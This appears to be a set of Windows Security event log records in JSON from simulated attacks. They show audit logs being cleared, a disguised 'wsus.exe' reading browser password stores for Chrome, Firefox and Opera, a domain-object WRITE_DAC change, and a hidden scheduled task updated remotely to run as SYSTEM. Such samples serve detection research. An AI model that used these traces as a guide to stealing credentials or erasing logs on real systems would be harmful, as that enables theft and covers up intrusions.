{"Timestamp": "2019-03-25 21:28:35.436632Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-1108", "EventID": 4662, "RecordID": 198242568, "Level": "0", "Descr": "An operation was performed on an object", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x40f2719", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "WRITE_DAC", "AccessMask": "0x40000", "Properties": "%%1539\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-03-25 21:28:11.073626Z", "Channel": "Security", "Provider": "Microsoft-Windows-Eventlog", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-1108", "EventID": 1102, "RecordID": 198242566, "Level": "Information", "Descr": "The audit log was cleared", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x8d7099"}
{"Timestamp": "2019-04-27 19:33:50.134293Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 4663, "RecordID": 4991, "Level": "0", "Descr": "An attempt was made to access an object", "Username": "IEUser", "Domain": "IEWIN7", "LogonId": "0xffa8", "ObjectServer": "Security", "ObjectType": "File", "ObjectName": "C:\\Users\\IEUser\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "HandleId": "0x50", "AccessList": "ReadData (or ListDirectory)", "AccessMask": "0x1", "ProcessId": "0x134c", "ProcessPath": "C:\\Users\\Defau1t\\wsus.exe"}
{"Timestamp": "2019-04-27 19:33:18.699755Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 4663, "RecordID": 4990, "Level": "0", "Descr": "An attempt was made to access an object", "Username": "IEUser", "Domain": "IEWIN7", "LogonId": "0xffa8", "ObjectServer": "Security", "ObjectType": "File", "ObjectName": "C:\\Users\\IEUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\kushu3sd.default\\logins.json", "HandleId": "0x50", "AccessList": "ReadData (or ListDirectory)", "AccessMask": "0x1", "ProcessId": "0x134c", "ProcessPath": "C:\\Users\\Defau1t\\wsus.exe"}
{"Timestamp": "2019-04-27 19:33:05.308188Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 4663, "RecordID": 4989, "Level": "0", "Descr": "An attempt was made to access an object", "Username": "IEUser", "Domain": "IEWIN7", "LogonId": "0xffa8", "ObjectServer": "Security", "ObjectType": "File", "ObjectName": "C:\\Users\\IEUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\kushu3sd.default\\key4.db", "HandleId": "0x50", "AccessList": "ReadData (or ListDirectory)", "AccessMask": "0x1", "ProcessId": "0x134c", "ProcessPath": "C:\\Users\\Defau1t\\wsus.exe"}
{"Timestamp": "2019-04-27 19:31:15.355063Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 4663, "RecordID": 4988, "Level": "0", "Descr": "An attempt was made to access an object", "Username": "IEUser", "Domain": "IEWIN7", "LogonId": "0xffa8", "ObjectServer": "Security", "ObjectType": "File", "ObjectName": "C:\\Users\\IEUser\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data", "HandleId": "0x50", "AccessList": "ReadData (or ListDirectory)", "AccessMask": "0x1", "ProcessId": "0x134c", "ProcessPath": "C:\\Users\\Defau1t\\wsus.exe"}
{"Timestamp": "2019-04-27 19:27:55.274060Z", "Channel": "Security", "Provider": "Microsoft-Windows-Eventlog", "Hostname": "IEWIN7", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 1102, "RecordID": 4987, "Level": "Information", "Descr": "The audit log was cleared", "Username": "IEUser", "Domain": "IEWIN7", "LogonId": "0xffa8"}
{"Timestamp": "2020-09-02 11:47:57.263194Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 2171296, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-18", "TargetUsername": "01566S-WIN16-IR$", "TargetDomain": "THREEBEESCO.COM", "TargetLogonId": "0x21aadb8", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": "-", "LogonGUID": "860D1189-6C67-C57B-59ED-C0676A052019", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "::1", "Port": "62863", "RestrictedAdminMode": "-", "TargetOutboundUsername": "-", "TargetOutboundDomain": "-", "ElevatedToken": "Yes"}
{"Timestamp": "2020-09-02 11:47:57.252932Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 2171295, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-18", "TargetUsername": "01566S-WIN16-IR$", "TargetDomain": "THREEBEESCO.COM", "TargetLogonId": "0x21aad4a", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": "-", "LogonGUID": "860D1189-6C67-C57B-59ED-C0676A052019", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "::1", "Port": "62862", "RestrictedAdminMode": "-", "TargetOutboundUsername": "-", "TargetOutboundDomain": "-", "ElevatedToken": "Yes"}
{"Timestamp": "2020-09-02 11:47:49.966623Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 2171294, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-18", "TargetUsername": "01566S-WIN16-IR$", "TargetDomain": "THREEBEESCO.COM", "TargetLogonId": "0x21aa47f", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": "-", "LogonGUID": "27FCE179-F80F-F6A6-7DF4-C247E783B072", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "::1", "Port": "62860", "RestrictedAdminMode": "-", "TargetOutboundUsername": "-", "TargetOutboundDomain": "-", "ElevatedToken": "Yes"}
{"Timestamp": "2020-09-02 11:47:48.959767Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": "S-1-5-21-308926384-506822093-3341789130-1106", "EventID": 4702, "RecordID": 2171293, "Level": "0", "Descr": "A scheduled task was updated", "Username": "a-jbrown", "Domain": "3B", "LogonId": "0x21a8c68", "TaskName": "\\LMST", "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Date>2020-09-02T04:47:49.74-07:00</Date>\n    <Author>a-jbrown</Author>\n    <Description>00304d6e</Description>\n    <URI>\\LMST</URI>\n  </RegistrationInfo>\n  <Triggers>\n    <TimeTrigger>\n      <StartBoundary>2020-02-09T04:47:48</StartBoundary>\n      <EndBoundary>2020-02-09T04:47:58</EndBoundary>\n      <Enabled>true</Enabled>\n    </TimeTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=\"Author\">\n      <RunLevel>HighestAvailable</RunLevel>\n      <UserId>SYSTEM</UserId>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <Duration>PT10M</Duration>\n      <WaitTimeout>PT1H</WaitTimeout>\n      <StopOnIdleEnd>true</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>true</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>cmd.exe</Command>\n      <Arguments>/c echo testing &gt; c:\\users\\public\\out.txt</Arguments>\n    </Exec>\n  </Actions>\n</Task>"}
{"Timestamp": "2020-09-02 11:47:48.842119Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 2171292, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-21-308926384-506822093-3341789130-1106", "TargetUsername": "a-jbrown", "TargetDomain": "THREEBEESCO.COM", "TargetLogonId": "0x21a8c9a", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": "-", "LogonGUID": "467413FE-B054-D9AE-C758-B41105A3ECA9", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "172.16.66.142", "Port": "60726", "RestrictedAdminMode": "-", "TargetOutboundUsername": "-", "TargetOutboundDomain": "-", "ElevatedToken": "Yes"}
{"Timestamp": "2020-09-02 11:47:48.823276Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 2171291, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-21-308926384-506822093-3341789130-1106", "TargetUsername": "a-jbrown", "TargetDomain": "THREEBEESCO.COM", "TargetLogonId": "0x21a8c80", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": "-", "LogonGUID": "467413FE-B054-D9AE-C758-B41105A3ECA9", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "172.16.66.142", "Port": "60728", "RestrictedAdminMode": "-", "TargetOutboundUsername": "-", "TargetOutboundDomain": "-", "ElevatedToken": "Yes"}
{"Timestamp": "2020-09-02 11:47:48.570502Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 2171290, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-21-308926384-506822093-3341789130-1106", "TargetUsername": "a-jbrown", "TargetDomain": "3B", "TargetLogonId": "0x21a8c68", "LogonType+": "3", "LogonType": "3", "LogonProcess": "NtLmSsp ", "AuthenticationPackage": "NTLM", "WorkstationName": "04246W-WIN10", "LogonGUID": "00000000-0000-0000-0000-000000000000", "TransmittedServices": "-", "KeyLength": "128", "ProcessId": "0x0", "ProcessPath": "-", "IP": "172.16.66.142", "Port": "60726", "RestrictedAdminMode": "-", "TargetOutboundUsername": "-", "TargetOutboundDomain": "-", "ElevatedToken": "Yes"}
{"Timestamp": "2020-09-02 11:47:39.499106Z", "Channel": "Security", "Provider": "Microsoft-Windows-Eventlog", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": "S-1-5-21-308926384-506822093-3341789130-1106", "EventID": 1102, "RecordID": 2171289, "Level": "Information", "Descr": "The audit log was cleared", "Username": "a-jbrown", "Domain": "3B", "LogonId": "0x38a14"}
{"Timestamp": "2019-03-18 23:24:11.085219Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565635, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "System", "Direction": "Outbound", "TargetIP": "10.255.255.255", "TargetPort": "137", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.320019Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565634, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Inbound", "TargetIP": "127.0.0.1", "TargetPort": "53316", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.287940Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565633, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Outbound", "TargetIP": "10.0.2.17", "TargetPort": "5357", "Protocol+": "6", "Protocol": "6", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.240883Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565632, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Inbound", "TargetIP": "::1", "TargetPort": "53317", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.069207Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565631, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "System", "Direction": "Outbound", "TargetIP": "10.0.2.15", "TargetPort": "138", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.069207Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565630, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "System", "Direction": "Outbound", "TargetIP": "10.255.255.255", "TargetPort": "138", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.069207Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565629, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Inbound", "TargetIP": "::1", "TargetPort": "53317", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.069207Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565628, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Outbound", "TargetIP": "ff02::c", "TargetPort": "3702", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.069207Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565627, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Outbound", "TargetIP": "ff02::c", "TargetPort": "3702", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.069207Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565626, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Inbound", "TargetIP": "127.0.0.1", "TargetPort": "53316", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.069207Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565625, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Outbound", "TargetIP": "239.255.255.250", "TargetPort": "3702", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:08.069207Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565624, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Outbound", "TargetIP": "239.255.255.250", "TargetPort": "3702", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:07.772839Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565623, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Outbound", "TargetIP": "ff02::1:2", "TargetPort": "547", "Protocol+": "17", "Protocol": "17", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:07.615924Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565622, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\lsass.exe", "Direction": "Inbound", "TargetIP": "fe80::79bf:8ee2:433c:2567", "TargetPort": "55875", "Protocol+": "6", "Protocol": "6", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:07.615924Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565621, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\lsass.exe", "Direction": "Outbound", "TargetIP": "fe80::79bf:8ee2:433c:2567", "TargetPort": "49155", "Protocol+": "6", "Protocol": "6", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:07.615924Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5158, "RecordID": 565620, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a bind to a local port", "ProcessId": "452", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\lsass.exe", "IP": "::", "Port": "55875", "Protocol+": "6", "Protocol": "6"}
{"Timestamp": "2019-03-18 23:24:07.601241Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565617, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "Direction": "Inbound", "TargetIP": "fe80::79bf:8ee2:433c:2567", "TargetPort": "55874", "Protocol+": "6", "Protocol": "6", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:07.601241Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5156, "RecordID": 565616, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a connection", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\lsass.exe", "Direction": "Outbound", "TargetIP": "fe80::79bf:8ee2:433c:2567", "TargetPort": "135", "Protocol+": "6", "Protocol": "6", "TargetSID": "S-1-0-0", "TargetMachineSID": "S-1-0-0"}
{"Timestamp": "2019-03-18 23:24:07.601241Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": null, "EventID": 5158, "RecordID": 565615, "Level": "0", "Descr": "The Windows Filtering Platform has permitted a bind to a local port", "ProcessId": "452", "ProcessPath": "\\device\\harddiskvolume2\\windows\\system32\\lsass.exe", "IP": "::", "Port": "55874", "Protocol+": "6", "Protocol": "6"}
